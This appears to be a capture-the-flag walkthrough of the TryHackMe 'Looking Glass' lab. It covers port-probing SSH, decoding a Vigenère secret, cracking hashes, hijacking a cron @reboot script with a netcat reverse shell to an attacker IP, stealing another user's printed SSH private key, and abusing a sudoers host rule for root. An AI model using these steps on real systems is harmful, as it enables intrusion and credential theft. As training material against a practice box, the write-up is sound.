# RECONNAISSANCE
---

On the port scan we got a bunch of `ssh` ports, let's try connecting to one of them as root and check what happens:


```
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@glass.thm -p 11607
The authenticity of host '[glass.thm]:11607 ([10.10.53.89]:11607)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This host key is known by the following other names/addresses:
 ~/.ssh/known_hosts:117: [glass.thm]:9000
 ~/.ssh/known_hosts:118: [glass.thm]:9002
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[glass.thm]:11607' (RSA) to the list of known hosts.
Higher
Connection to glass.thm closed.
```

As seen, we get `Higher`, if we connect to a lower port we get:

```
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@glass.thm -p 9000

The authenticity of host '[glass.thm]:9000 ([10.10.53.89]:9000)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[glass.thm]:9000' (RSA) to the list of known hosts.
Lower
Connection to glass.thm closed
```

Seems like we need to check port by port which one is the correct one, we can automate this task with python:

```python
import subprocess
import sys

# Define your port range
ports = list(range(9000, 13784))

print("[*] Starting SSH port scan... Press Ctrl+C to stop.\n")

try:
 for port in ports:
 print(f"[+] Testing port {port}...", end=" ", flush=True)

 cmd = [
 "ssh",
 "-T", # no pseudo-tty
 "-o", "StrictHostKeyChecking=no",
 "-o", "HostKeyAlgorithms=+ssh-rsa",
 "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
 "root@glass.thm",
 "-p", str(port)
 ]

 proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 try:
 # If the service hangs (doesn't close), we'll timeout here
 output_bytes, _ = proc.communicate(timeout=5)
 output = output_bytes.decode(errors="ignore").strip()
 except subprocess.TimeoutExpired:
 proc.kill()
 print("âœ… Service found! (timeout detected)")
 print(f"\n--- Port {port} is the real service (hung instead of closing) ---\n")
 sys.exit(0)

 # If we got here, it closed quickly and returned something
 if "Higher" in output or "Lower" in output:
 print("Not it")
 else:
 # It returned something unexpected but didn't hang
 print("âœ… Service found!")
 print(f"\n--- Banner on port {port} ---\n{output}\n")
 sys.exit(0)

 print("[!] No valid port found.")
 sys.exit(1)

except KeyboardInterrupt:
 print("\n[!] Scan interrupted by user.")
 sys.exit(0)
```

Make sure to do initial reconnaissance on where the service could be located first, in that case you can lower the range of the ports, for this machine i found the service was located through `12320` and `12330`, each time you restart the machine it changes, so, I'll change the script like this:

```python
import subprocess
import sys

# Define your port range
ports = list(range(12320, 12331))

print("[*] Starting SSH port scan... Press Ctrl+C to stop.\n")

try:
 for port in ports:
 print(f"[+] Testing port {port}...", end=" ", flush=True)

 cmd = [
 "ssh",
 "-T", # no pseudo-tty
 "-o", "StrictHostKeyChecking=no",
 "-o", "HostKeyAlgorithms=+ssh-rsa",
 "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
 "root@glass.thm",
 "-p", str(port)
 ]

 proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 try:
 # If the service hangs (doesn't close), we'll timeout here
 output_bytes, _ = proc.communicate(timeout=5)
 output = output_bytes.decode(errors="ignore").strip()
 except subprocess.TimeoutExpired:
 proc.kill()
 print("âœ… Service found! (timeout detected)")
 print(f"\n--- Port {port} is the real service (hung instead of closing) ---\n")
 sys.exit(0)

 # If we got here, it closed quickly and returned something
 if "Higher" in output or "Lower" in output:
 print("Not it")
 else:
 # It returned something unexpected but didn't hang
 print("âœ… Service found!")
 print(f"\n--- Banner on port {port} ---\n{output}\n")
 sys.exit(0)

 print("[!] No valid port found.")
 sys.exit(1)

except KeyboardInterrupt:
 print("\n[!] Scan interrupted by user.")
 sys.exit(0)

```

```python
python3 find_ports.py
[*] Starting SSH port scan... Press Ctrl+C to stop.

[+] Testing port 12320... Not it
[+] Testing port 12321... Not it
[+] Testing port 12322... Not it
[+] Testing port 12323... Not it
[+] Testing port 12324... Not it
[+] Testing port 12325... Not it
[+] Testing port 12326... âœ… Service found! (timeout detected)

--- Port 12326 is the real service (hung instead of closing) ---
```

Once we find the real port, we get this:

```python
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@glass.thm -p 12326
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

Let's begin exploitation.


# EXPLOITATION
---


As seen, this is a `vigenere cipher`, let's try to decode it:


![Pasted image 20250610224830.png](../../IMAGES/Pasted%20image%2020250610224830.png)

We got the key, use it to decode:

![Pasted image 20250610231128.png](../../IMAGES/Pasted%20image%2020250610231128.png)

As seen, we get the secret:

```
bewareTheJabberwock
```


Now submit it on the ssh port:


```
Enter Secret:	
jabberwock:NeedlesShynessPeaceStreaming
```

This password changes each time you reset the machine, you need to do the testing for ports and this step if you reset the machine or it gets shut down, we can go into ssh now:

![Pasted image 20250610231410.png](../../IMAGES/Pasted%20image%2020250610231410.png)

We can now begin privilege escalation.


# PRIVILEGE ESCALATION
---


Let's check our privileges and our home directory:

```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
 (root) NOPASSWD: /sbin/reboot

jabberwock@looking-glass:~$ ls -la
total 44
drwxrwxrwx 5 jabberwock jabberwock 4096 Jul 3 2020 .
drwxr-xr-x 8 root root 4096 Jul 3 2020 ..
lrwxrwxrwx 1 root root 9 Jul 3 2020 .bash_history -> /dev/null
-rw-r--r-- 1 jabberwock jabberwock 220 Jun 30 2020 .bash_logout
-rw-r--r-- 1 jabberwock jabberwock 3771 Jun 30 2020 .bashrc
drwx------ 2 jabberwock jabberwock 4096 Jun 30 2020 .cache
drwx------ 3 jabberwock jabberwock 4096 Jun 30 2020 .gnupg
drwxrwxr-x 3 jabberwock jabberwock 4096 Jun 30 2020 .local
-rw-r--r-- 1 jabberwock jabberwock 807 Jun 30 2020 .profile
-rw-rw-r-- 1 jabberwock jabberwock 935 Jun 30 2020 poem.txt
-rwxrwxr-x 1 jabberwock jabberwock 38 Jul 3 2020 twasBrillig.sh
-rw-r--r-- 1 jabberwock jabberwock 38 Jul 3 2020 user.txt
```

We got the first flag on here, also there is a poem and a script too, we can reboot the machine using sudo, let's check `/etc/crontab` to check what happens when the box boots up:

```
jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

On reboot, the script on our home directory runs, since we can modify it, we can exploiting by making a backup of the original script and replacing it with a reverse shell:

```
cp twasBrillig.sh twasBrillig.sh.bak
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.21.28 9001 >/tmp/f" > twasBrillig.sh
```

Now, let's reboot while we have our listener ready:

![Pasted image 20250610232024.png](../../IMAGES/Pasted%20image%2020250610232024.png)

Once it reboots, we get our shell, let's stabilize it:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250610232117.png](../../IMAGES/Pasted%20image%2020250610232117.png)

We are `tweedledum`, let's check our home directory:

```
tweedledum@looking-glass:~$ ls -la
total 28
drwx------ 2 tweedledum tweedledum 4096 Jul 3 2020 .
drwxr-xr-x 8 root root 4096 Jul 3 2020 ..
lrwxrwxrwx 1 root root 9 Jul 3 2020 .bash_history -> /dev/null
-rw-r--r-- 1 tweedledum tweedledum 220 Jun 30 2020 .bash_logout
-rw-r--r-- 1 tweedledum tweedledum 3771 Jun 30 2020 .bashrc
-rw-r--r-- 1 tweedledum tweedledum 807 Jun 30 2020 .profile
-rw-r--r-- 1 root root 520 Jul 3 2020 humptydumpty.txt
-rw-r--r-- 1 root root 296 Jul 3 2020 poem.txt
```

We got `humptydumpty.txt`:

```
tweedledum@looking-glass:~$ cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

If we analyze them, they seem like a series of hashes, let's use crackstation to check:

![Pasted image 20250610232252.png](../../IMAGES/Pasted%20image%2020250610232252.png)

Only the last one if not `sha256`, let's try to analyze it:

![Pasted image 20250610232341.png](../../IMAGES/Pasted%20image%2020250610232341.png)

This is hex encoded, we can decode it in the same website:

![Pasted image 20250610232423.png](../../IMAGES/Pasted%20image%2020250610232423.png)

We got a password:

```
zyxwvutsrqponmlk
```

Let's check `/etc/passwd` to check which user is this:

```
tweedledum@looking-glass:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:TryHackMe:/home/tryhackme:/bin/bash
jabberwock:x:1001:1001:,,,:/home/jabberwock:/bin/bash
tweedledum:x:1002:1002:,,,:/home/tweedledum:/bin/bash
tweedledee:x:1003:1003:,,,:/home/tweedledee:/bin/bash
humptydumpty:x:1004:1004:,,,:/home/humptydumpty:/bin/bash
alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
```

Pretty obvious this is the password for the `humptydumpty` user, let's switch then:

![Pasted image 20250610232612.png](../../IMAGES/Pasted%20image%2020250610232612.png)

```
humptydumpty@looking-glass:~$ ls -la
total 28
drwx------ 3 humptydumpty humptydumpty 4096 Jun 11 04:25 .
drwxr-xr-x 8 root root 4096 Jul 3 2020 ..
lrwxrwxrwx 1 root root 9 Jul 3 2020 .bash_history -> /dev/null
-rw-r--r-- 1 humptydumpty humptydumpty 220 Jul 3 2020 .bash_logout
-rw-r--r-- 1 humptydumpty humptydumpty 3771 Jul 3 2020 .bashrc
drwx------ 3 humptydumpty humptydumpty 4096 Jun 11 04:25 .gnupg
-rw-r--r-- 1 humptydumpty humptydumpty 807 Jul 3 2020 .profile
-rw-r--r-- 1 humptydumpty humptydumpty 3084 Jul 3 2020 poetry.txt
```

Nothing interesting on our home directory, but, if we check `/home` we can notice this:


```
ls -la /home
total 32
drwxr-xr-x 8 root root 4096 Jul 3 2020 .
drwxr-xr-x 24 root root 4096 Jul 2 2020 ..
drwx--x--x 6 alice alice 4096 Jul 3 2020 alice
drwx------ 4 humptydumpty humptydumpty 4096 Jun 11 04:27 humptydumpty
drwxrwxrwx 5 jabberwock jabberwock 4096 Jun 11 04:18 jabberwock
drwx------ 5 tryhackme tryhackme 4096 Jul 3 2020 tryhackme
drwx------ 3 tweedledee tweedledee 4096 Jul 3 2020 tweedledee
drwx------ 2 tweedledum tweedledum 4096 Jul 3 2020 tweedledum
```

As seen in the permissions for `alice`, we can execute stuff, we cannot do `ls` or `cd` but we can use cat, let's try reading `.bashrc` for example:

```
humptydumpty@looking-glass:/tmp$ cat /home/alice/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
 *i*) ;;
 *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
 debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
 xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
 if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
 else
	color_prompt=
 fi
fi

if [ "$color_prompt" = yes ]; then
 PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
 PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
 PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
 ;;
*)
 ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
 test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
 alias ls='ls --color=auto'
 #alias dir='dir --color=auto'
 #alias vdir='vdir --color=auto'

 alias grep='grep --color=auto'
 alias fgrep='fgrep --color=auto'
 alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands. Use like so:
# sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
 . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
 if [ -f /usr/share/bash-completion/bash_completion ]; then
 . /usr/share/bash-completion/bash_completion
 elif [ -f /etc/bash_completion ]; then
 . /etc/bash_completion
 fi
fi
```

It works, we can simply grab `id_rsa` now:

```
humptydumpty@looking-glass:/tmp$ cat /home/alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

Save it and go into ssh with that:

![Pasted image 20250610233743.png](../../IMAGES/Pasted%20image%2020250610233743.png)
Let's check valuable stuff for it, we can use `linpeas`:

![Pasted image 20250610233939.png](../../IMAGES/Pasted%20image%2020250610233939.png)

As seen, the sudoers file has something on it, we got:

```
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

We can abuse this to get a shell as root by doing:

```
sudo -h ssalg-gnikool /bin/bash
```

![Pasted image 20250610234029.png](../../IMAGES/Pasted%20image%2020250610234029.png)

Nice, we were able to get root, let's get both flags:

```
root@looking-glass:/tmp# cat /home/jabberwock/user.txt
}32a911966cab2d643f5d57d9e0173d56{mht
```

Oh, first flag is reversed, we can do:

```
root@looking-glass:/tmp# cat /home/jabberwock/user.txt | rev
thm{65d3710e9d75d5f346d2bac669119a23}
```

Nice, let's get final flag, this one's reversed too:

```
root@looking-glass:/tmp# cat /root/root.txt | rev
thm{bc2337b6f97d057b01da718ced6ead3f}
```

![Pasted image 20250610234200.png](../../IMAGES/Pasted%20image%2020250610234200.png)

